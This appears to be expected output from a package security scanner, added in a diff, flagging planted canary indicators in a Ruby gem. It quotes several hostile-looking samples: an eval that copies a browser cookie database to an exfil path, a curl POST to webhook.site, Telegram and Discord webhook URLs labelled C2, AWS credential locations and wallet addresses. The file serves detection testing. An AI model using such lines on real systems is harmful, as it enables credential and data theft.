@@ -1,0 +1,46 @@
+
+[*] METADATA (2)
+  └─ [LOW ] Version published 23h ago (threshold: 72h)
+  └─ [LOW ] Single maintainer: mauroeldritch
+
+[*] DANGEROUS FUNCTIONS (4)
+  └─ [HIGH] eval => CHANGELOG.md:7
+        Indicators included: Telegram C2 URL, Discord webhook, ETH wallet (OFAC sanctioned), BTC wallet (DOJ…
+  └─ [HIGH] eval => README.md:17
+        | _eval_ call | Dangerous function | Static safe string |
+  └─ [HIGH] eval => lib/commissar/canary.rb:17
+        EVAL_SAMPLE = 'eval("cp key4.db /tmp/exfil_cookies.db")'
+  └─ [MED ] send => lib/commissar/canary.rb:12
+        TELEGRAM_C2 = "https://api.telegram.org/bot1234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage…
+
+[*] SUSPICIOUS URLS (3)
+  └─ [HIGH] api.telegram.org => lib/commissar/canary.rb:12
+        TELEGRAM_C2 = "https://api.telegram.org/bot1234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage…
+  └─ [HIGH] discord.com/api/webhooks => lib/commissar/canary.rb:15
+        DISCORD_WEBHOOK = "https://discord.com/api/webhooks/987654321098765432/xXxXxXxXxXxXxXxXxXxXxXxXxXxXx…
+  └─ [MED ] webhook.site => lib/commissar/canary.rb:22
+        EXFIL_SAMPLE = "curl -X POST https://webhook.site/canary-test -d @/dev/null"
+
+[*] SHELL/EXFIL (1)
+  └─ [HIGH] curl -X POST => lib/commissar/canary.rb:22
+        EXFIL_SAMPLE = "curl -X POST https://webhook.site/canary-test -d @/dev/null"
+
+[*] ENCODED PAYLOADS (2)
+  └─ [HIGH] High entropy line (5.5 bits/char, 103 chars) => lib/commissar/canary.rb:12
+        TELEGRAM_C2 = "https://api.telegram.org/bot1234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage…
+  └─ [HIGH] High entropy line (5.1 bits/char, 78 chars) => lib/commissar/canary.rb:22
+        EXFIL_SAMPLE = "curl -X POST https://webhook.site/canary-test -d @/dev/null"
+
+[*] CREDENTIALS (2)
+  └─ [HIGH] ENV["AWS_ACCESS_KEY_ID"] => lib/commissar/canary.rb:19
+        AWS_CRED_SAMPLE   = 'ENV["AWS_ACCESS_KEY_ID"]'
+  └─ [HIGH] ~/.aws/credentials => lib/commissar/canary.rb:20
+        CRED_PATH_SAMPLE  = "~/.aws/credentials"
+
+[*] WEB3 (2)
+  └─ [HIGH] ETH wallet address => lib/commissar/canary.rb:6
+        ETH_WALLET = "0x098B716B8Aaf21512996dC57EB0615e2383E2f96"
+  └─ [HIGH] BTC wallet address => lib/commissar/canary.rb:9
+        BTC_WALLET = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn"
+
+[!] Risk score: 100/100 — DANGEROUS, DO NOT INSTALL
